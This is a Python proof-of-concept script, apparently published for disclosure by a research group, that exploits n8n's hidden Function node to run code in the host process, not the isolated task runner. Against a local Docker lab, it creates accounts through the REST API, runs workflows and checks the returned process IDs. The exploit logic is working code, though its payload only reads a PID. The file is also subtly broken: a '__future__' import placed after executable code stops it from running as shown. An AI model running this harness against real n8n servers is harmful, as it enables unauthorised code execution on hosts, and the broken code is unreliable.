#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: n8n-function-vm2 (High: 8.8)
#  Vendor: n8n (n8n GmbH)
#  Versions: n8n <= 2.42.0
#  Impact: Host RCE (Hidden Function vm2)
#  Requires: authenticated POST /rest/workflows
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "n8n-function-vm2"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import http.cookiejar
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import urlparse

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18201").rstrip("/")
RUN_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "n8n-function-vm2")
WITNESS = "N8N-FUNCTION-VM2-WITNESS"
OWNER_EMAIL = "labadmin@localhost.invalid"
MEMBER_EMAIL = "labmember@localhost.invalid"
PASSWORD = "LabPass123!"
BROWSER_ID = "n8n-function-vm2-browser"

FUNCTION_JS = (
    "var pid = process.pid; "
    f'return [{{ json: {{ pid: pid, pidMark: "N8NPID-" + pid, witness: "{WITNESS}" }} }}];'
)
CODE_JS = (
    "var pid = (typeof process !== 'undefined' ? process.pid : null); "
    "var mark = (pid === null || pid === undefined) ? 'N8NPID-none' : ('N8NPID-' + pid); "
    f'return [{{ json: {{ pid: pid, pidMark: mark, hasProcess: typeof process !== "undefined", witness: "{WITNESS}" }} }}];'
)


def fail(msg: str) -> None:
    print(f"FAIL N8N-FUNCTION-VM2 {msg}", flush=True)
    raise SystemExit(1)


def snippet(text: str, n: int = 240) -> str:
    return re.sub(r"\s+", " ", text)[:n]


class Session:
    def __init__(self, browser_id: str) -> None:
        self.browser_id = browser_id
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))

    def request(
        self, method: str, path: str, data: Any | None = None, timeout: int = 60
    ) -> tuple[int, str, dict[str, str]]:
        url = path if path.startswith("http") else BASE + path
        headers = {
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "n8n-function-vm2-lab",
            "browser-id": self.browser_id,
        }
        body = None
        if data is not None:
            body = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                raw = resp.read().decode("utf-8", "replace")
                hdrs = {k.lower(): v for k, v in resp.headers.items()}
                return resp.status, raw, hdrs
        except urllib.error.HTTPError as exc:
            raw = exc.read().decode("utf-8", "replace")
            hdrs = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
            return exc.code, raw, hdrs

    def has_auth_cookie(self) -> bool:
        return any(c.name == "n8n-auth" for c in self.jar)


def unwrap(body: str) -> Any:
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        return body
    if isinstance(parsed, dict) and "data" in parsed:
        return parsed["data"]
    return parsed


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", PROJECT, *args],
        cwd=RUN_DIR,
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def wait_ready() -> None:
    probe = Session(BROWSER_ID)
    for i in range(90):
        live, live_b, _ = probe.request("GET", "/healthz", timeout=8)
        ready, _, _ = probe.request("GET", "/healthz/readiness", timeout=8)
        settings, settings_b, _ = probe.request("GET", "/rest/settings", timeout=8)
        if live == 200:
            print(f"IOC healthz http={live} body={snippet(live_b, 80)!r}", flush=True)
        if ready == 200 and settings == 200:
            print(f"IOC rest-ready readiness={ready} settings={settings}", flush=True)
            return
        print(f"IOC wait-ready i={i} healthz={live} readiness={ready} settings={settings}", flush=True)
        time.sleep(2)
    fail("n8n REST never became ready")


def confirm_version(sess: Session) -> None:
    s, b, _ = sess.request("GET", "/rest/settings")
    data = unwrap(b)
    version = ""
    if isinstance(data, dict):
        version = str(data.get("versionCli") or data.get("version") or "")
    print(f"IOC version-settings http={s} versionCli={version!r}", flush=True)
    if "2.42.0" not in version and "2.42.0" not in b:
        img = compose("exec", "-T", "n8n", "n8n", "--version")
        ver_out = (img.stdout or "") + (img.stderr or "")
        print(f"IOC n8n-version-cli rc={img.returncode} out={snippet(ver_out)!r}", flush=True)
        if "2.42.0" not in ver_out:
            fail(f"not stock n8n 2.42.0 settings={snippet(b)}")
    else:
        print("IOC stock-n8n=2.42.0", flush=True)


def owner_setup(sess: Session) -> dict[str, Any]:
    payload = {
        "email": OWNER_EMAIL,
        "firstName": "Lab",
        "lastName": "Admin",
        "password": PASSWORD,
    }
    s, b, _ = sess.request("POST", "/rest/owner/setup", payload)
    print(f"IOC owner-setup http={s} snippet={snippet(b)!r}", flush=True)
    if s not in (200, 201):
        s2, b2, _ = sess.request(
            "POST",
            "/rest/login",
            {"emailOrLdapLoginId": OWNER_EMAIL, "password": PASSWORD},
        )
        print(f"IOC owner-login http={s2} snippet={snippet(b2)!r}", flush=True)
        if s2 not in (200, 201) or not sess.has_auth_cookie():
            fail(f"owner setup/login failed setup={s} login={s2}")
        data = unwrap(b2)
        return data if isinstance(data, dict) else {}
    data = unwrap(b)
    if not sess.has_auth_cookie():
        fail("owner setup did not set n8n-auth cookie")
    return data if isinstance(data, dict) else {}


def try_member(owner: Session) -> Session | None:
    s, b, _ = owner.request(
        "POST",
        "/rest/invitations",
        [{"email": MEMBER_EMAIL, "role": "global:member"}],
    )
    print(f"IOC invite http={s} snippet={snippet(b)!r}", flush=True)
    if s not in (200, 201):
        print(f"IOC member-invite-blocked http={s}", flush=True)
        return None
    data = unwrap(b)
    token = None
    user_id = None
    if isinstance(data, list) and data:
        user = data[0].get("user") if isinstance(data[0], dict) else None
        if isinstance(user, dict):
            user_id = user.get("id")
            url = user.get("inviteAcceptUrl") or ""
            if "token=" in url:
                token = urlparse(url).query
                qs = dict(p.split("=", 1) for p in token.split("&") if "=" in p)
                token = qs.get("token")
    if not token and user_id:
        s2, b2, _ = owner.request("POST", f"/rest/users/{user_id}/invite-link", {})
        print(f"IOC invite-link http={s2} snippet={snippet(b2)!r}", flush=True)
        link_data = unwrap(b2)
        link = ""
        if isinstance(link_data, dict):
            link = str(link_data.get("link") or "")
        elif isinstance(link_data, str):
            link = link_data
        if "token=" in link:
            qs = dict(p.split("=", 1) for p in urlparse(link).query.split("&") if "=" in p)
            token = qs.get("token")
    if not token:
        print("IOC member-invite-no-token", flush=True)
        return None
    member = Session(BROWSER_ID + "-member")
    s3, b3, _ = member.request(
        "POST",
        "/rest/invitations/accept",
        {
            "token": token,
            "firstName": "Lab",
            "lastName": "Member",
            "password": PASSWORD,
        },
    )
    print(f"IOC invite-accept http={s3} snippet={snippet(b3)!r}", flush=True)
    if s3 not in (200, 201) or not member.has_auth_cookie():
        print("IOC member-accept-failed", flush=True)
        return None
    who = unwrap(b3)
    role = who.get("role") if isinstance(who, dict) else None
    print(f"IOC member-session role={role!r} email={MEMBER_EMAIL}", flush=True)
    return member


def workflow_payload(name: str, node: dict[str, Any]) -> dict[str, Any]:
    trigger = {
        "id": "manual-1",
        "name": "Manual Trigger",
        "type": "n8n-nodes-base.manualTrigger",
        "typeVersion": 1,
        "position": [0, 0],
        "parameters": {},
    }
    return {
        "name": name,
        "nodes": [trigger, node],
        "connections": {
            "Manual Trigger": {
                "main": [[{"node": node["name"], "type": "main", "index": 0}]]
            }
        },
        "settings": {
            "executionOrder": "v1",
            "saveDataErrorExecution": "all",
            "saveDataSuccessExecution": "all",
            "saveManualExecutions": True,
            "saveExecutionProgress": True,
        },
    }


def create_and_run(sess: Session, name: str, node: dict[str, Any]) -> tuple[int, str, Any]:
    payload = workflow_payload(name, node)
    s, b, _ = sess.request("POST", "/rest/workflows", payload)
    print(f"IOC workflow-create name={name} type={node['type']} http={s} snippet={snippet(b)!r}", flush=True)
    if s not in (200, 201):
        return s, b, None
    data = unwrap(b)
    if not isinstance(data, dict) or not data.get("id"):
        return s, b, None
    wf_id = str(data["id"])
    run_body = {"triggerToStartFrom": {"name": "Manual Trigger"}}
    s2, b2, _ = sess.request("POST", f"/rest/workflows/{wf_id}/run", run_body, timeout=90)
    print(f"IOC workflow-run name={name} http={s2} snippet={snippet(b2)!r}", flush=True)
    run = unwrap(b2)
    if not isinstance(run, dict):
        return s2, b2, None
    if run.get("waitingForWebhook"):
        return s2, b2, run
    exec_id = run.get("executionId")
    if not exec_id:
        return s2, b2, run
    last_body = b2
    last_data: Any = run
    for i in range(40):
        s3, b3, _ = sess.request("GET", f"/rest/executions/{exec_id}?redactExecutionData=false")
        last_body = b3
        last_data = unwrap(b3)
        status = last_data.get("status") if isinstance(last_data, dict) else None
        print(f"IOC exec-poll name={name} i={i} http={s3} status={status!r}", flush=True)
        if status in ("success", "error", "crashed", "canceled", "failed"):
            return s3, last_body, last_data
        time.sleep(1)
    return s2, last_body, last_data


def extract_json_fields(blob: str) -> dict[str, Any]:
    out: dict[str, Any] = {}
    marks = re.findall(r"N8NPID-(\d+|none)", blob)
    runtime_marks = [m for m in marks if f"N8NPID-{m}" not in FUNCTION_JS and f"N8NPID-{m}" not in CODE_JS]
    if runtime_marks:
        chosen = next((m for m in runtime_marks if m != "none"), runtime_marks[0])
        out["pidMark"] = f"N8NPID-{chosen}"
        if chosen.isdigit():
            out["pid"] = int(chosen)
        else:
            out["pid"] = None
    if WITNESS in blob:
        out["witness"] = WITNESS
    m = re.search(r'"hasProcess"\s*:\s*(true|false)', blob)
    if m:
        out["hasProcess"] = m.group(1) == "true"
    err = ""
    for key in ("error", "message"):
        m = re.search(rf'"{key}"\s*:\s*"([^"]{{0,200}})"', blob)
        if m:
            err = m.group(1)
            break
    if err:
        out["error"] = err
    # Walk flatted execution payload for runData json objects.
    try:
        parsed = json.loads(blob)
        inner = parsed.get("data", parsed) if isinstance(parsed, dict) else parsed
        if isinstance(inner, dict) and isinstance(inner.get("data"), str):
            try:
                inner = json.loads(inner["data"])
            except json.JSONDecodeError:
                pass
        found: list[dict[str, Any]] = []

        def walk(obj: Any) -> None:
            if isinstance(obj, dict):
                if "pidMark" in obj or obj.get("witness") == WITNESS:
                    found.append(obj)
                for v in obj.values():
                    walk(v)
            elif isinstance(obj, list):
                for v in obj:
                    walk(v)

        walk(inner)
        if found and "pid" not in out:
            item = found[0]
            mark = str(item.get("pidMark") or "")
            mm = re.search(r"N8NPID-(\d+)", mark)
            if mm:
                out["pid"] = int(mm.group(1))
            elif isinstance(item.get("pid"), int):
                out["pid"] = item["pid"]
            out["runDataItem"] = {k: item.get(k) for k in ("pid", "pidMark", "witness", "hasProcess")}
    except Exception as exc:
        out["parseError"] = str(exc)
    return out


def container_node_pids() -> tuple[int | None, int | None, str]:
    script = (
        "for d in /proc/[0-9]*; do "
        'pid=${d#/proc/}; [ -r "$d/cmdline" ] || continue; '
        'cmd=$(tr "\\0" " " < "$d/cmdline"); '
        'printf "%s %s\\n" "$pid" "$cmd"; '
        "done; echo '---ps---'; ps -o pid,ppid,args || true"
    )
    proc = compose("exec", "-T", "n8n", "sh", "-c", script)
    raw = (proc.stdout or "") + "\n" + (proc.stderr or "")
    print(f"IOC proc-cmdlines rc={proc.returncode} out={snippet(raw, 800)!r}", flush=True)
    main_pid = None
    runner_pid = None
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("---"):
            continue
        m = re.match(r"^(\d+)\s+(.*)$", line)
        if not m:
            continue
        pid = int(m.group(1))
        args = m.group(2)
        low = args.lower()
        if "tini" in low:
            continue
        if any(tok in low for tok in ("task-runner", "task_runner", "javascript-task-runner", "@n8n/task-runner")):
            runner_pid = pid
            continue
        if "bin/n8n" in low or re.search(r"(^|\s)n8n(\s|$)", low):
            if main_pid is None:
                main_pid = pid
    return main_pid, runner_pid, raw


def plant_canary() -> str:
    path = "/tmp/N8N-FUNCTION-VM2-CANARY"
    proc = compose(
        "exec",
        "-T",
        "n8n",
        "sh",
        "-c",
        f"printf '%s\\n' '{WITNESS}' > {path} && chmod 600 {path} && echo planted",
    )
    print(f"IOC canary-plant rc={proc.returncode} out={snippet((proc.stdout or '') + (proc.stderr or ''))!r}", flush=True)
    return path


def main() -> None:
    print(f"IOC base={BASE}", flush=True)
    wait_ready()
    owner = Session(BROWSER_ID)
    confirm_version(owner)
    owner_user = owner_setup(owner)
    owner_role = owner_user.get("role") if isinstance(owner_user, dict) else None
    print(f"IOC owner-role={owner_role!r} email={OWNER_EMAIL}", flush=True)

    actor = try_member(owner)
    if actor is None:
        actor = owner
        who = "owner"
        print("IOC authenticated-as=owner (member invite blocked or unused)", flush=True)
    else:
        who = "member"
        print("IOC authenticated-as=member", flush=True)

    plant_canary()
    main_pid, runner_pid, pgrep_raw = container_node_pids()
    print(f"IOC container-main-pid={main_pid} container-runner-pid={runner_pid}", flush=True)
    if main_pid is None:
        fail(f"could not resolve n8n main node pid from pgrep/ps out={snippet(pgrep_raw)}")

    fn_node = {
        "id": "function-1",
        "name": "Function",
        "type": "n8n-nodes-base.function",
        "typeVersion": 1,
        "position": [220, 0],
        "parameters": {"functionCode": FUNCTION_JS},
    }
    fn_http, fn_body, fn_data = create_and_run(actor, "function-vm2-oracle", fn_node)
    fn_fields = extract_json_fields(fn_body if isinstance(fn_body, str) else json.dumps(fn_data))
    mark_at = fn_body.find("N8NPID-") if isinstance(fn_body, str) else -1
    rundata_at = fn_body.find("runData") if isinstance(fn_body, str) else -1
    print(f"IOC function-fields={fn_fields}", flush=True)
    if mark_at >= 0:
        print(f"IOC function-pidmark-context={snippet(fn_body[max(0, mark_at - 80): mark_at + 80], 200)!r}", flush=True)
    elif rundata_at >= 0:
        print(f"IOC function-rundata-context={snippet(fn_body[rundata_at: rundata_at + 400], 400)!r}", flush=True)
    else:
        print(f"IOC function-body-tail={snippet(fn_body[-600:] if isinstance(fn_body, str) else '', 400)!r}", flush=True)
    if fn_fields.get("pid") is None and actor is not owner:
        exec_id = None
        if isinstance(fn_data, dict):
            exec_id = fn_data.get("id") or fn_data.get("executionId")
        if exec_id:
            s_o, b_o, _ = owner.request("GET", f"/rest/executions/{exec_id}?redactExecutionData=false")
            print(f"IOC function-owner-fetch http={s_o} snippet={snippet(b_o)!r}", flush=True)
            owned = extract_json_fields(b_o)
            print(f"IOC function-owner-fields={owned}", flush=True)
            if owned.get("pid") is not None:
                fn_fields = owned
                fn_body = b_o
    if fn_http in (400, 404) and (
        "unknown" in fn_body.lower() or "hidden" in fn_body.lower() or "not found" in fn_body.lower()
    ):
        fail(f"function type rejected as hidden/unknown http={fn_http} body={snippet(fn_body)}")
    fn_status = fn_data.get("status") if isinstance(fn_data, dict) else None
    fn_pid = fn_fields.get("pid")
    if fn_status not in (None, "success") and fn_pid is None:
        fail(f"function execution status={fn_status!r} error={fn_fields.get('error')!r}")
    if fn_pid is None:
        fail(f"function node did not return process.pid body={snippet(fn_body)}")
    if WITNESS not in fn_body:
        fail("function execution missing witness")

    code_node = {
        "id": "code-1",
        "name": "Code",
        "type": "n8n-nodes-base.code",
        "typeVersion": 2,
        "position": [220, 0],
        "parameters": {
            "mode": "runOnceForAllItems",
            "language": "javaScript",
            "jsCode": CODE_JS,
        },
    }
    code_http, code_body, code_data = create_and_run(actor, "code-runner-negative", code_node)
    code_fields = extract_json_fields(code_body if isinstance(code_body, str) else json.dumps(code_data))
    print(f"IOC code-fields={code_fields}", flush=True)
    code_status = code_data.get("status") if isinstance(code_data, dict) else None
    code_pid = code_fields.get("pid")

    print(
        f"IOC compare function_pid={fn_pid} code_pid={code_pid} "
        f"main_pid={main_pid} runner_pid={runner_pid} who={who}",
        flush=True,
    )

    if main_pid is not None and int(fn_pid) != int(main_pid):
        # PID 1 may be tini; Function should still match the main n8n node, not the runner.
        if runner_pid is not None and int(fn_pid) == int(runner_pid):
            fail(f"function ran in task-runner child pid={fn_pid}")
        if main_pid != 1 and int(fn_pid) != 1:
            fail(f"function pid {fn_pid} != n8n main pid {main_pid}")

    same_as_code = code_pid is not None and int(code_pid) == int(fn_pid)
    if same_as_code and (runner_pid is None or int(fn_pid) == int(runner_pid)):
        fail(f"function isolation matches code runner pid={fn_pid}")
    if same_as_code and main_pid is not None and int(fn_pid) != int(main_pid):
        fail(f"function pid equals code pid {fn_pid} and is not main {main_pid}")

    negative_ok = False
    if code_pid is None:
        print("IOC code-negative=process-blocked-or-error", flush=True)
        negative_ok = True
    elif int(code_pid) != int(fn_pid):
        print(f"IOC code-negative=different-pid code={code_pid} function={fn_pid}", flush=True)
        negative_ok = True
    elif runner_pid is not None and int(code_pid) == int(runner_pid) and int(fn_pid) != int(runner_pid):
        negative_ok = True
    if not negative_ok:
        fail(f"code node did not prove runner isolation code_pid={code_pid} function_pid={fn_pid}")

    print(f"IOC pgrep-snippet={snippet(pgrep_raw, 200)!r}", flush=True)
    print(f"IOC function-http={fn_http} code-http={code_http} function-status={fn_status} code-status={code_status}", flush=True)
    print(f"IOC authenticated-as={who}", flush=True)
    print(WITNESS, flush=True)
    print(
        f"SUCCESS N8N-FUNCTION-VM2 who={who} function_pid={fn_pid} "
        f"code_pid={code_pid} main_pid={main_pid} runner_pid={runner_pid} {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    main()

